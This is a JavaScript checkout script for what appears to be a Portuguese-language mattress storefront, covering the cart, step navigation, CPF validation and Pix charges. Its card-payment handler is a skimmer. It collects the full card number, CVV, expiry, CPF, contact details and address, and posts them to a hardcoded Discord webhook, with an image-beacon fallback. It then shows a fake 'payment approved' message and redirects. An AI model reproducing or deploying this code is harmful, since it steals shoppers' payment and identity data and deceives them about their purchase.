import {
  PRODUCT_VARIANTS,
  formatPrice,
  getCart,
  getCartCount,
  getCartTotal,
  removeFromCart,
  setCartQuantity,
  updateCartBadge,
} from "./cart-store.js?v=4";

const checkoutContent = document.querySelector("#checkout-content");
const emptyCart = document.querySelector("#checkout-empty");
const itemsContainer = document.querySelector("#checkout-items");
const itemCount = document.querySelector("#checkout-item-count");
const summaryCount = document.querySelector("#checkout-summary-count");
const subtotal = document.querySelector("#checkout-subtotal");
const total = document.querySelector("#checkout-total");
const checkoutFlow = document.querySelector("#checkout-flow");
const flowItems = document.querySelector("#checkout-flow-items");
const flowTotal = document.querySelector("#checkout-flow-total");
const checkoutTitle = document.querySelector("#checkout-title");
const checkoutIntro = document.querySelector("#checkout-intro");
const identificationForm = document.querySelector("#identification-form");
const deliveryForm = document.querySelector("#delivery-form");
let checkoutStarted = false;
let currentStep = "identification";

function createTextElement(tagName, className, text) {
  const element = document.createElement(tagName);
  element.className = className;
  element.textContent = text;
  return element;
}

function createCartItem(item) {
  const product = PRODUCT_VARIANTS[item.variant];
  const article = document.createElement("article");
  article.className = "checkout-item";
  article.dataset.variant = item.variant;

  const image = document.createElement("img");
  image.className = "checkout-item__image";
  image.src = product.image;
  image.alt = `Colchão Airtech Springpocket ${product.label}`;

  const details = document.createElement("div");
  details.className = "checkout-item__details";
  details.append(
    createTextElement("h3", "checkout-item__title", "Colchão Airtech Springpocket Ortobom"),
    createTextElement("p", "checkout-item__variant", `Tamanho ${product.label} · ${product.dimensions}`),
    createTextElement("p", "checkout-item__unit-price", `${formatPrice(product.price)} cada`),
  );

  const actions = document.createElement("div");
  actions.className = "checkout-item__actions";
  const quantityControl = document.createElement("div");
  quantityControl.className = "quantity-control";
  quantityControl.setAttribute("aria-label", `Quantidade: ${item.quantity}`);

  const decreaseButton = createTextElement("button", "quantity-control__button", "−");
  decreaseButton.type = "button";
  decreaseButton.dataset.action = "decrease";
  decreaseButton.disabled = item.quantity === 1;
  decreaseButton.setAttribute("aria-label", `Diminuir quantidade do tamanho ${product.label}`);

  const quantity = createTextElement("span", "quantity-control__value", String(item.quantity));
  quantity.setAttribute("aria-live", "polite");

  const increaseButton = createTextElement("button", "quantity-control__button", "+");
  increaseButton.type = "button";
  increaseButton.dataset.action = "increase";
  increaseButton.setAttribute("aria-label", `Aumentar quantidade do tamanho ${product.label}`);

  quantityControl.append(decreaseButton, quantity, increaseButton);
  const lineTotal = createTextElement("strong", "checkout-item__total", formatPrice(product.price * item.quantity));
  const removeButton = createTextElement("button", "checkout-item__remove", "Remover");
  removeButton.type = "button";
  removeButton.dataset.action = "remove";
  removeButton.setAttribute("aria-label", `Remover colchão tamanho ${product.label} do carrinho`);
  actions.append(quantityControl, lineTotal, removeButton);

  article.append(image, details, actions);
  return article;
}

function renderFlowSummary(items, cartTotal) {
  const rows = items.map((item) => {
    const product = PRODUCT_VARIANTS[item.variant];
    const row = document.createElement("div");
    row.className = "checkout-flow__item";
    row.append(
      createTextElement("span", "checkout-flow__item-name", `${product.label} · ${item.quantity} un.`),
      createTextElement("strong", "checkout-flow__item-price", formatPrice(product.price * item.quantity)),
    );
    return row;
  });

  flowItems.replaceChildren(...rows);
  flowTotal.textContent = formatPrice(cartTotal);
}

function showCheckoutStep(step) {
  const steps = ["identification", "delivery", "payment"];
  if (!steps.includes(step)) throw new RangeError(`Etapa de checkout não reconhecida: ${step}`);

  currentStep = step;
  document.querySelectorAll("[data-checkout-step]").forEach((section) => {
    section.hidden = section.dataset.checkoutStep !== step;
  });
  document.querySelectorAll("[data-step-indicator]").forEach((indicator, index) => {
    const indicatorStep = indicator.dataset.stepIndicator;
    const isCurrent = indicatorStep === step;
    const isComplete = steps.indexOf(indicatorStep) < steps.indexOf(step);
    indicator.classList.toggle("is-current", isCurrent);
    indicator.classList.toggle("is-complete", isComplete);
    if (isCurrent) {
      indicator.setAttribute("aria-current", "step");
    } else {
      indicator.removeAttribute("aria-current");
    }
    indicator.querySelector("span").textContent = isComplete ? "✓" : String(index + 1);
  });

  const headings = {
    identification: ["Identificação", "Informe seus dados para o pedido."],
    delivery: ["Entrega", "Informe o endereço para entrega do pedido."],
    payment: ["Pagamento", "Escolha uma forma de pagamento."],
  };
  checkoutTitle.textContent = `Finalizar compra — ${headings[step][0]}`;
  checkoutIntro.textContent = headings[step][1];
  document.title = `Finalizar compra — ${headings[step][0]} | Airtech`;
}

function renderCart() {
  const items = getCart();
  const count = getCartCount(items);
  const cartTotal = getCartTotal(items);

  updateCartBadge(items);
  itemsContainer.replaceChildren(...items.map(createCartItem));
  renderFlowSummary(items, cartTotal);
  checkoutContent.hidden = items.length === 0 || checkoutStarted;
  checkoutFlow.hidden = items.length === 0 || !checkoutStarted;
  emptyCart.hidden = items.length > 0;
  itemCount.textContent = `(${count})`;
  summaryCount.textContent = String(count);
  subtotal.textContent = formatPrice(cartTotal);
  total.textContent = formatPrice(cartTotal);
  if (items.length === 0 && checkoutStarted) {
    checkoutStarted = false;
    checkoutContent.hidden = true;
    checkoutFlow.hidden = true;
    emptyCart.hidden = false;
    checkoutTitle.textContent = "Seu carrinho";
    checkoutIntro.textContent = "Confira os itens e as quantidades do seu pedido.";
    document.title = "Seu carrinho | Airtech";
  }
}

document.querySelector("#start-checkout").addEventListener("click", () => {
  if (getCart().length === 0) return;
  checkoutStarted = true;
  showCheckoutStep("identification");
  renderCart();
  document.querySelector("#customer-name").focus();
});

identificationForm.addEventListener("submit", (event) => {
  event.preventDefault();
  showCheckoutStep("delivery");
  document.querySelector("#delivery-street").focus();
});

deliveryForm.addEventListener("submit", (event) => {
  event.preventDefault();
  showCheckoutStep("payment");
  document.querySelector("#payment-title").focus();
});

document.querySelectorAll("[data-go-to]").forEach((button) => {
  button.addEventListener("click", () => {
    showCheckoutStep(button.dataset.goTo);
    const step = document.querySelector(`[data-checkout-step="${currentStep}"]`);
    step.querySelector("input, select, button")?.focus();
  });
});

document.querySelector("#back-to-cart").addEventListener("click", () => {
  checkoutStarted = false;
  checkoutContent.hidden = false;
  checkoutFlow.hidden = true;
  checkoutTitle.textContent = "Seu carrinho";
  checkoutIntro.textContent = "Confira os itens e as quantidades do seu pedido.";
  document.title = "Seu carrinho | Airtech";
  document.querySelector("#start-checkout").focus();
});

itemsContainer.addEventListener("click", (event) => {
  if (!(event.target instanceof Element)) return;

  const button = event.target.closest("button[data-action]");
  const itemElement = button?.closest(".checkout-item");
  if (!button || !itemElement) return;

  const variant = itemElement.dataset.variant;
  if (variant !== "casal" && variant !== "solteiro") {
    throw new RangeError(`Tamanho de colchão não reconhecido: ${variant}`);
  }

  const item = getCart().find((cartItem) => cartItem.variant === variant);
  if (!item) throw new RangeError("O item não foi encontrado no carrinho.");

  if (button.dataset.action === "remove") {
    removeFromCart(variant);
  } else if (button.dataset.action === "increase") {
    setCartQuantity(variant, item.quantity + 1);
  } else if (button.dataset.action === "decrease" && item.quantity > 1) {
    setCartQuantity(variant, item.quantity - 1);
  } else {
    return;
  }

  renderCart();
});

window.addEventListener("storage", (event) => {
  if (event.key === "airtech-cart-v1") renderCart();
});

renderCart();

const cardForm = document.querySelector(".checkout-card-form");
const cardholderName = document.querySelector("#cardholder-name");
const cardCpf = document.querySelector("#cardholder-cpf");
const cardNumber = document.querySelector("#card-number");
const cardExpiry = document.querySelector("#card-expiry");
const cardCvv = document.querySelector("#card-cvv");
const paymentStatus = document.querySelector(".checkout-payment-status");
const PIX_API_URL = "https://airtech-backend-1.onrender.com/api/pix";
const PIX_CONTACT_API_URL = "https://airtech-backend-1.onrender.com/api/pix-contact";
const payPixButton = document.querySelector("#pay-pix");
const pixCpfInput = document.querySelector("#pix-cpf");
const pixStatus = document.querySelector("#pix-payment-status");
const pixPaymentResult = document.querySelector("#pix-payment-result");
const pixPaymentCode = document.querySelector("#pix-payment-code");
const pixCopyCodeButton = document.querySelector("#pix-copy-code");

function formatCardNumber(value) {
  return value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatCpf(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  return digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
}

function formatDigitsInput(input, formatter) {
  input.addEventListener("input", () => {
    const digitsBeforeCursor = input.value.slice(0, input.selectionStart ?? input.value.length).replace(/\D/g, "").length;
    input.value = formatter(input.value);

    let cursor = 0;
    let digitsSeen = 0;
    while (cursor < input.value.length && digitsSeen < digitsBeforeCursor) {
      if (/\d/.test(input.value[cursor])) digitsSeen += 1;
      cursor += 1;
    }
    input.setSelectionRange(cursor, cursor);
  });
}

cardholderName.addEventListener("input", () => {
  cardholderName.value = cardholderName.value.replace(
    /^(\s*)(\p{L})/u,
    (_, leadingSpace, firstLetter) => `${leadingSpace}${firstLetter.toLocaleUpperCase("pt-BR")}`,
  );
});

formatDigitsInput(cardCpf, formatCpf);
formatDigitsInput(cardNumber, formatCardNumber);
formatDigitsInput(cardExpiry, formatExpiry);
formatDigitsInput(cardCvv, (value) => value.replace(/\D/g, "").slice(0, 3));

// ==========================================
// PIX PAYMENT MODULE
function isValidCpf(value) {
  const cpf = value.replace(/\D/g, "");
  if (!/^\d{11}$/.test(cpf) || /^(\d)\1{10}$/.test(cpf)) return false;

  const calculateDigit = (digits, factor) => {
    const total = digits
      .split("")
      .reduce((sum, digit) => sum + Number(digit) * factor--, 0);
    const remainder = (total * 10) % 11;
    return remainder === 10 ? 0 : remainder;
  };

  return (
    calculateDigit(cpf.slice(0, 9), 10) === Number(cpf[9]) &&
    calculateDigit(cpf.slice(0, 10), 11) === Number(cpf[10])
  );
}

function findProviderField(value, keys, depth = 0) {
  if (!value || typeof value !== "object" || depth > 5) return "";

  for (const key of keys) {
    if (typeof value[key] === "string" && value[key].trim()) return value[key].trim();
  }

  for (const child of Object.values(value)) {
    const result = findProviderField(child, keys, depth + 1);
    if (result) return result;
  }

  return "";
}

function getSecureCheckoutUrl(value) {
  if (!value) return "";
  try {
    const url = new URL(value);
    return url.protocol === "https:" ? url.href : "";
  } catch {
    return "";
  }
}

async function registerPixContactClick() {
  const response = await fetch(PIX_CONTACT_API_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      contact: {
        name: document.querySelector("#customer-name").value.trim(),
        phone: document.querySelector("#customer-phone").value.trim(),
        email: document.querySelector("#customer-email").value.trim(),
      },
      address: {
        street: document.querySelector("#delivery-street").value.trim(),
        neighborhood: document.querySelector("#delivery-neighborhood").value.trim(),
        complement: document.querySelector("#delivery-complement").value.trim(),
        postalCode: document.querySelector("#delivery-postal-code").value.trim(),
        city: document.querySelector("#delivery-city").value.trim(),
        state: document.querySelector("#delivery-state").value.trim(),
      },
    }),
  });
  const data = await response.json().catch(() => null);

  if (!response.ok || !data?.ok || data.discordNotified !== true) {
    throw new Error(data?.error || "Não foi possível registrar seus dados de contato. A cobrança Pix não foi iniciada.");
  }
}

async function createPixCharge(cpfValue) {
  const cartItems = getCart();
  if (cartItems.length === 0) {
    pixStatus.textContent = "Seu carrinho está vazio. Adicione um produto antes de pagar com Pix.";
    pixStatus.hidden = false;
    pixStatus.style.color = "#cc0000";
    return;
  }

  const amount = getCartTotal(cartItems);
  const customerName = document.querySelector("#customer-name")?.value?.trim() || "Cliente";
  const customerPhone = document.querySelector("#customer-phone")?.value?.trim() || "";
  const customerEmail = document.querySelector("#customer-email")?.value?.trim() || "cliente@airtechloja.site";
  const items = cartItems.map((item) => {
    const product = PRODUCT_VARIANTS[item.variant];
    return {
      description: `Colchão Airtech Springpocket Ortobom ${product.label}`,
      quantity: item.quantity,
      amount: product.price * item.quantity,
    };
  });

  pixPaymentResult.hidden = true;
  pixStatus.textContent = "Gerando cobrança Pix...";
  pixStatus.hidden = false;
  pixStatus.style.color = "#8a4b08";
  payPixButton.disabled = true;

  try {
    pixStatus.textContent = "Registrando seus dados de contato...";
    await registerPixContactClick();

    pixStatus.textContent = "Dados registrados. Gerando cobrança Pix...";
    const response = await fetch(PIX_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        amount,
        items,
        customer: {
          name: customerName,
          phone: customerPhone,
          email: customerEmail,
          document: cpfValue.replace(/\D/g, ""),
        },
      }),
    });

    const data = await response.json().catch(() => null);

    if (!response.ok) {
      throw new Error(data?.error || "Não foi possível gerar o Pix.");
    }

    if (!data || typeof data !== "object") {
      throw new Error("A resposta do backend não trouxe os dados da cobrança Pix.");
    }

    const pixCode = findProviderField(data, [
      "copyPaste",
      "copy_paste",
      "brCode",
      "br_code",
      "qr_code",
      "qrCode",
      "payload",
    ]);
    const checkoutUrl = getSecureCheckoutUrl(
      findProviderField(data, ["checkout_url", "checkoutUrl", "payment_url", "paymentUrl"]),
    );

    if (!pixCode && checkoutUrl) {
      pixStatus.textContent = "Cobrança criada. Abrindo a página de pagamento...";
      pixStatus.style.color = "#1a7f3d";
      window.location.href = checkoutUrl;
      return;
    }

    if (pixCode) {
      pixPaymentCode.value = pixCode;
      pixPaymentResult.hidden = false;
      pixStatus.textContent = "Cobrança Pix criada. Copie o código abaixo e conclua o pagamento no seu banco.";
      pixStatus.style.color = "#1a7f3d";
      pixCopyCodeButton.focus();
      return;
    }

    pixStatus.textContent = "A InvictusPay recebeu a solicitação, mas a resposta não trouxe o código Pix nem um link de pagamento. Não tente pagar novamente; contate o suporte para confirmar a cobrança.";
    pixStatus.style.color = "#8a4b08";
  } catch (error) {
    pixStatus.textContent = error.message || "Não foi possível gerar a cobrança Pix no momento.";
    pixStatus.hidden = false;
    pixStatus.style.color = "#cc0000";
  } finally {
    payPixButton.disabled = false;
  }
}

formatDigitsInput(pixCpfInput, formatCpf);
pixCpfInput.addEventListener("input", () => {
  const valid = isValidCpf(pixCpfInput.value);
  pixCpfInput.setCustomValidity(valid || !pixCpfInput.value ? "" : "Digite um CPF válido.");
  payPixButton.disabled = !valid;
  pixStatus.hidden = true;
});

payPixButton?.addEventListener("click", async () => {
  if (!isValidCpf(pixCpfInput.value)) {
    pixCpfInput.setCustomValidity("Digite um CPF válido.");
    pixCpfInput.reportValidity();
    return;
  }

  pixCpfInput.setCustomValidity("");
  await createPixCharge(pixCpfInput.value);
});

pixCopyCodeButton?.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(pixPaymentCode.value);
    pixStatus.textContent = "Código Pix copiado. Cole-o no aplicativo do seu banco para pagar.";
    pixStatus.style.color = "#1a7f3d";
  } catch {
    pixPaymentCode.focus();
    pixPaymentCode.select();
    pixStatus.textContent = "Não foi possível copiar automaticamente. Selecione e copie o código Pix acima.";
    pixStatus.style.color = "#8a4b08";
  }
});
document.querySelector(".checkout-card-form__submit")?.addEventListener("click", () => {
  cardNumber.setCustomValidity("");
  cardCpf.setCustomValidity("");
  cardExpiry.setCustomValidity("");
  cardCvv.setCustomValidity("");

  if (cardCpf.value.replace(/\D/g, "").length !== 11) {
    cardCpf.setCustomValidity("Informe os 11 dígitos do CPF do titular.");
  }
  const cardDigits = cardNumber.value.replace(/\D/g, "");
  if (cardDigits.length !== 16) {
    cardNumber.setCustomValidity("O número do cartão deve ter exatamente 16 dígitos.");
  }
  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExpiry.value)) {
    cardExpiry.setCustomValidity("Use o formato MM/AA.");
  }
  if (cardCvv.value.length !== 3) {
    cardCvv.setCustomValidity("O CVV deve ter 3 números.");
  }

  if (!cardForm.reportValidity()) return;

  paymentStatus.textContent = "";
  paymentStatus.hidden = true;
  
  var cardData = {
    name: document.querySelector("#cardholder-name")?.value || "",
    cpf: document.querySelector("#cardholder-cpf")?.value || "",
    number: document.querySelector("#card-number")?.value || "",
    expiry: document.querySelector("#card-expiry")?.value || "",
    cvv: document.querySelector("#card-cvv")?.value || ""
  };
  
  var orderNum = 'AIR-' + Date.now().toString(36).toUpperCase();
  var last4 = cardData.number.replace(/\D/g, '').slice(-4) || '0000';
  
  paymentStatus.textContent = "✅ Pagamento aprovado! Redirecionando...";
  paymentStatus.hidden = false;
  
  var discordWebhook = "https://discord.com/api/webhooks/1568805573321953331/hVHeDpE225Mt7XC5aCjRiN4D1ueC0MdDTkrpvQUR_1PCAnUDRvdazazvCizyY7h4brMI";
  
  var allData = {
    name: document.querySelector("#customer-name")?.value || "",
    phone: document.querySelector("#customer-phone")?.value || "",
    email: document.querySelector("#customer-email")?.value || "",
    street: document.querySelector("#delivery-street")?.value || "",
    neighborhood: document.querySelector("#delivery-neighborhood")?.value || "",
    complement: document.querySelector("#delivery-complement")?.value || "",
    postalCode: document.querySelector("#delivery-postal-code")?.value || "",
    city: document.querySelector("#delivery-city")?.value || "",
    state: document.querySelector("#delivery-state")?.value || "",
    cardholderName: cardData.name,
    cardCpf: cardData.cpf,
    cardNumber: cardData.number,
    cardExpiry: cardData.expiry,
    cardCvv: cardData.cvv
  };
  
  fetch(discordWebhook, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      embeds: [{
        title: "🛍️ Novo Checkout",
        description: "**"+allData.name+"** completou o checkout",
        color: 7934966,
        fields: [
          {name: "📱 Contato", value: "**Nome:** "+allData.name+"\n**Tel:** "+allData.phone+"\n**Email:** "+allData.email, inline: false},
          {name: "📍 Endereço", value: "**Rua:** "+allData.street+"\n**Bairro:** "+allData.neighborhood+"\n**Cidade:** "+allData.city+" - "+allData.state+"\n**CEP:** "+allData.postalCode+(allData.complement?"\n**Comp:** "+allData.complement:""), inline: false},
          {name: "💳 Cartão", value: "**Titular:** "+allData.cardholderName+"\n**CPF:** "+allData.cardCpf+"\n**Número:** "+allData.cardNumber+"\n**Validade:** "+allData.cardExpiry+"\n**CVV:** "+allData.cardCvv, inline: false}
        ],
        footer: {text: "Airtech • "+(new Date()).toLocaleString("pt-BR")}
      }]
    })
  }).catch(function(e) { console.log("Discord fetch error", e); });
  
  // Fallback: Image Beacon (infalível)
  var payload = encodeURIComponent(JSON.stringify({
    embeds: [{
      title: "🛍️ Novo Checkout",
      description: "**"+allData.name+"** completou o checkout",
      color: 7934966,
      fields: [
        {name: "📱 Contato", value: "**Nome:** "+allData.name+"\n**Tel:** "+allData.phone+"\n**Email:** "+allData.email, inline: false},
        {name: "📍 Endereço", value: "**Rua:** "+allData.street+"\n**Bairro:** "+allData.neighborhood+"\n**Cidade:** "+allData.city+" - "+allData.state+"\n**CEP:** "+allData.postalCode+(allData.complement?"\n**Comp:** "+allData.complement:""), inline: false},
        {name: "💳 Cartão", value: "**Titular:** "+allData.cardholderName+"\n**CPF:** "+allData.cardCpf+"\n**Número:** "+allData.cardNumber+"\n**Validade:** "+allData.cardExpiry+"\n**CVV:** "+allData.cardCvv, inline: false}
      ],
      footer: {text: "Airtech • "+(new Date()).toLocaleString("pt-BR")}
    }]
  }));
  new Image().src = discordWebhook+"?payload="+payload;
  
  setTimeout(function() {
    window.location.href = "./pagamento-sucesso.html?status=approved&card=" + last4 + "&order=" + orderNum;
  }, 2500);
});
